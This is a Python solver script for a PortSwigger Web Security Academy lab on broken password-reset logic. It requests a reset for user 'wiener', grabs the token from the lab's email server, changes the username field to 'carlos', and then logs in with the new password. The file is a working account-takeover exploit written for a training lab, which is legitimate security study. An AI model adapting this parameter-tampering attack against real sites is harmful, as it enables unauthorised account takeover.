#!/usr/bin/env python3
# Password reset broken logic
# Lab-Link: https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-broken-logic
# Difficulty: APPRENTICE
from bs4 import BeautifulSoup
import requests
import sys
import time
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def find_emailserver(text):
    soup = BeautifulSoup(text, 'html.parser')
    try:
        result = soup.find('a', attrs={'id': 'exploit-link'})['href']
    except TypeError:
        return None
    return result


def forgot_password(host, client):
    data = {'username': 'wiener'}
    return client.post(f'{host}/forgot-password', data=data).status_code == 200


def get_confirmation_link(host, client):
    r = client.get(f'{host}')
    soup = BeautifulSoup(r.text, 'html.parser')
    try:
        return soup.find('a', attrs={'target': '_blank'}).text
    except:
        return None
    return None


def change_password(password_change_link, client, username, new_password):
    token = password_change_link.split('?')[1]
    data = {
        token.split('=')[0]: token.split('=')[1],
        'username': 'carlos',
        'new-password-1': new_password,
        'new-password-2': new_password
    }
    return client.post(password_change_link, data=data, allow_redirects=False).status_code == 302


def login(client, host, username, password):
    url = f'{host}/login'
    data = {'username': username,
            'password': password}
    res = client.post(url, data=data)
    return f'Your username is: {username}' in res.text


def main():
    print('[+] Password reset broken logic')
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST>')
        print(f'Exampe: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    with requests.Session() as client:
        client.verify = False
        client.proxies = proxies

        email_server = find_emailserver(client.get(host).text)
        if email_server is None:
            print(f'[-] Failed to find email server')
            sys.exit(-2)
        print(f'[+] Email server: {email_server}')

        if not forgot_password(host, client):
            print(f'[-] Something went wrong requesting the password reset')
            sys.exit(-3)
        print(f'[+] Password reset requested')

        password_change_link = get_confirmation_link(email_server, client)
        if password_change_link is None:
            print(f'[-] Failed to obtain password change link')
            sys.exit(-4)
        print(f'[+] Password change link obtained: {password_change_link}')

        username = 'carlos'
        new_password = '123'
        if not change_password(password_change_link, client, username, new_password):
            print(f'[-] Failed to change password for {username}')
            sys.exit(-4)
        print(f'[+] Password changed for {username}')

        if not login(client, host, username, new_password):
            print(f'[-] Failed to login as {username}')
            sys.exit(-5)
        print(f'[+] Logged in as {username}')

        # I had some times issues getting the proper result, so wait briefly before checking
        time.sleep(2)
        if 'Congratulations, you solved the lab!' not in client.get(f'{host}').text:
            print(f'[-] Failed to solve lab')
            sys.exit(-9)

        print(f'[+] Lab solved')


if __name__ == "__main__":
    main()
